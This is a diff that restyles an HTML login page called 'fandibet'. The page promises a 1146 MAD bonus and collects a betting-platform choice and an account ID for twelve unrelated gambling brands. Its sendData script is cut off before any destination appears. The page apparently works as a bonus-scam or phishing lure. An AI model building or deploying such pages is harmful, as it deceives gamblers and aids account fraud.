@@ -5,86 +5,117 @@
   <title>fandibet</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
   <style>
-    body { margin:0; background:#0b0c10; color:#fff; font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif; min-height:100vh; display:flex; flex-direction:column; }
-    header { background:#1c1c1c; height:44px; display:flex; justify-content:center; align-items:center; }
-    .logo { font-size:16px; font-weight:500; }
-    .bonus { text-align:left; padding:10px; font-size:13px; }
-    .bonus-offer { text-align:left; padding:0 10px 5px 10px; font-size:13px; font-weight:600; color:#28c76f; }
-    .big-login { text-align:left; padding:0 10px; font-size:28px; font-weight:700; margin:10px 0; }
-    .container { margin-top:10px; display:flex; justify-content:center; flex:1; }
-    .form-box { width:95%; max-width:320px; display:flex; flex-direction:column; gap:16px; }
-    .input-group { display:flex; flex-direction:column; gap:4px; }
-    .input-group label { font-size:13px; color:#fff; display:flex; align-items:center; gap:6px; flex-wrap:wrap; }
-    .required-star { color:#ff3b3b; margin-left:2px; }
-    .token-icon { width:18px; height:18px; display:inline-block; vertical-align:middle; }
-    .input-group select, .input-group input { width:100%; height:34px; border:none; border-radius:4px; background:#dfe4eb; font-size:13px; color:#000; padding:0 8px; box-sizing:border-box; }
-    .input-group select:focus, .input-group input:focus { outline:none; box-shadow:none; }
-    .login-btn { margin-top:30px; width:100%; height:46px; background:#28c76f; border:none; border-radius:6px; color:#000; font-size:15px; font-weight:500; cursor:pointer; display:flex; align-items:center; justify-content:center; position:relative; }
-    .spinner { width:20px; height:20px; border:3px solid rgba(0,0,0,0.2); border-top:3px solid #000; border-radius:50%; animation: spin 0.8s linear infinite; }
-    @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
-    .platform-tags { margin-top:10px; display:flex; flex-wrap:wrap; justify-content:center; gap:4px; }
-    .platform-tags span { background:#1c1c1c; color:#28c76f; font-size:11px; padding:4px 8px; border-radius:12px; opacity:0.85; }
-    .cookie-text { text-align:center; font-size:12px; line-height:1.6; margin:15px auto 5px auto; max-width:360px; color:#fff; }
-    .cookie-text p { margin:0 0 8px 0; }
-    .cookie-text a { color:#28c76f; text-decoration:none; }
-    .footer-text { text-align:center; font-size:12px; margin:5px auto 20px auto; color:#aaa; }
-    .disabled * { pointer-events:none; opacity:0.6; }
-    .loading-screen { position:fixed; top:0; left:0; width:100%; height:100%; background:#0b0c10; display:flex; align-items:center; justify-content:center; z-index:999; flex-direction:column; }
-    .loading-text { margin-top:12px; font-size:14px; color:#fff; }
+    body {margin:0;background:#0b0c10;color:#fff;font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;}
+    
+    /* ===== Header ===== */
+    header {background:#1c1c1c;height:50px;display:flex;justify-content:center;align-items:center;box-shadow:0 2px 4px rgba(0,0,0,0.4);}
+    .logo {font-size:18px;font-weight:600;letter-spacing:1px;color:#fff;} /* صار أبيض */
+    
+    /* ===== Bonus Section ===== */
+    .bonus-box {text-align:center;background:rgba(40,199,111,0.1);padding:14px;margin:14px;border-radius:10px;}
+    .bonus {font-size:14px;}
+    .bonus-offer {margin-top:6px;font-size:14px;font-weight:700;color:#28c76f;}
+    
+    /* ===== Login Title ===== */
+    .big-login {text-align:center;font-size:26px;font-weight:700;margin:15px 0;}
+    
+    /* ===== Form ===== */
+    .container {flex:1;display:flex;justify-content:center;align-items:flex-start;}
+    .form-box {width:95%;max-width:340px;display:flex;flex-direction:column;gap:18px;padding:20px;background:#1a1c1f;border-radius:10px;box-shadow:0 4px 10px rgba(0,0,0,0.4);}
+    
+    .input-group {display:flex;flex-direction:column;gap:6px;}
+    .input-group label {font-size:13px;color:#fff;display:flex;align-items:center;gap:6px;}
+    .required-star {color:#ff3b3b;}
+    .token-icon {width:18px;height:18px;vertical-align:middle;}
+    .input-group select, .input-group input {
+      width:100%;height:38px;border:none;border-radius:6px;background:#dfe4eb;
+      font-size:13px;color:#000;padding:0 10px;box-sizing:border-box;
+    }
+    .input-group select:focus, .input-group input:focus {outline:none;box-shadow:0 0 0 2px #28c76f;}
+    
+    /* ===== Button ===== */
+    .login-btn {
+      margin-top:10px;width:100%;height:46px;
+      background:linear-gradient(135deg,#28c76f,#20a85d);
+      border:none;border-radius:6px;color:#000;font-size:15px;font-weight:600;
+      cursor:pointer;display:flex;align-items:center;justify-content:center;transition:0.25s;
+    }
+    .login-btn:hover {transform:scale(1.03);}
+    
+    .spinner {width:22px;height:22px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid #28c76f;border-radius:50%;animation: spin 0.8s linear infinite;}
+    @keyframes spin {0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+    
+    /* ===== Legal Text + Footer ===== */
+    .legal-text {text-align:center;font-size:12px;margin:15px auto 5px auto;max-width:360px;color:#bbb;}
+    .legal-text a {color:#28c76f;text-decoration:none;}
+    .footer-text {text-align:center;font-size:11px;margin:10px auto 20px auto;color:#666;}
+    
+    /* ===== States ===== */
+    .disabled * {pointer-events:none;opacity:0.6;}
+    .loading-screen {position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(11,12,16,0.95);display:flex;align-items:center;justify-content:center;z-index:999;flex-direction:column;}
+    .loading-text {margin-top:12px;font-size:15px;color:#28c76f;}
   </style>
 </head>
 <body translate="no">
+  
+  <!-- Header -->
   <header>
     <div class="logo" translate="no">fandibet</div>
   </header>
-  <div class="bonus" translate="no">Crédit d'un bonus d'un montant de 1146 MAD</div>
-  <div class="bonus-offer" translate="no">100% DE BONUS SUR VOTRE PREMIER DEPOSIT</div>
+  
+  <!-- Bonus -->
+  <div class="bonus-box">
+    <div class="bonus" translate="no">🎁 Crédit d'un bonus d'un montant de 1146 MAD</div>
+    <div class="bonus-offer" translate="no">100% DE BONUS SUR VOTRE PREMIER DEPOSIT</div>
+  </div>
+  
+  <!-- Login Title -->
   <div class="big-login" translate="no">Log In</div>
+  
+  <!-- Form -->
   <div class="container">
     <div class="form-box" id="formBox">
+      
+      <!-- Platform -->
       <div class="input-group">
         <label for="platform" translate="no">Plateforme <span class="required-star">*</span></label>
         <select id="platform" name="platform" translate="no">
-          <option>Betwinner</option>
-          <option>888Starz</option>
-          <option>Xparibet</option>
-          <option>MelBet</option>
-          <option>1xBet</option>
-          <option>LINEBET</option>
-          <option>Mega Pari</option>
-          <option>Gooobet</option>
-          <option>Stake</option>
-          <option>MyStake</option>
-          <option>1win</option>
-          <option>RiskoBet</option>
+          <option>Betwinner</option><option>888Starz</option><option>Xparibet</option>
+          <option>MelBet</option><option>1xBet</option><option>LINEBET</option>
+          <option>Mega Pari</option><option>Gooobet</option><option>Stake</option>
+          <option>MyStake</option><option>1win</option><option>RiskoBet</option>
         </select>
       </div>
+      
+      <!-- Account -->
       <div class="input-group">
         <label id="account-label" for="account" translate="no">Numéro de compte ID: <span class="required-star">*</span></label>
         <input type="text" id="account" name="account" translate="no" />
       </div>
+      
+      <!-- Button -->
       <button class="login-btn" type="button" id="loginBtn" onclick="sendData()">
         <span id="btnText">Log In</span>
       </button>
-      <div class="platform-tags" translate="no">
-        <span>Betwinner</span><span>888Starz</span><span>Xparibet</span><span>MelBet</span><span>1xBet</span><span>LINEBET</span><span>Mega Pari</span><span>Gooobet</span><span>Stake</span><span>MyStake</span><span>1win</span><span>RiskoBet</span>
+      
+      <!-- Legal Notice -->
+      <div class="legal-text">
+        By using this website, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
       </div>
-      <div class="cookie-text">
-        <p>
-          يستخدم <strong>fandibet</strong> ملفات تعريف الارتباط لضمان حصولك على أفضل تجربة مستخدم.<br>
-          بمواصلة تصفح الموقع، فإنك توافق على استخدام ملفات تعريف الارتباط على <strong>fandibet</strong>.
-        </p>
-        <a href="#">تعرّف على المزيد</a>
-      </div>
+      
+      <!-- Footer -->
       <div class="footer-text">
-        © 2019 - 2025 "fandibet" جميع الحقوق محفوظة – الطبع والنشر محمي.
+        © 2019 - 2025 fandibet
       </div>
     </div>
   </div>
+  
+  <!-- Loading -->
   <div id="loadingScreen" class="loading-screen" style="display:none;">
     <div class="spinner"></div>
     <div class="loading-text">Chargement...</div>
   </div>
+  
   <script>
     const platformSelect = document.getElementById('platform');
     const accountLabel = document.getElementById('account-label');
